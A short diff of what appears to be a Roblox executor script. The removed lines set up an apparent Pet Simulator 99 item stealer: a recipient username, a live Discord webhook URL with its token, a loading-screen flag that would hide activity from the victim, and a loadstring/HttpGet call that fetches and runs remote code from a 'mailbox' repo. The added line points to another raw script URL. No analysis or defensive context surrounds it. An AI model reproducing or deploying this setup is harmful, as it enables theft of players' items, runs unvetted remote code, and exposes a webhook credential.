@@ -1,9 +1,1 @@
-Username = "xgivepsxx"
-Username2 = "xgivepsxx"
-
-Webhook = "https://discord.com/api/webhooks/1078978682598735882/K8rdZDOMzSVslpDT9KKotZOhrvgCR5yz1dNqYydb_uxG094iCelQ9kped0zbIBZrkP_W"
-
-LoadingScreen = true
-MinimumRAP = 10000
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/whyrawlinkempty/ps99/main/mailbox"))()
+https://raw.githubusercontent.com/JamexJ/fishhuge.io/main/autofram
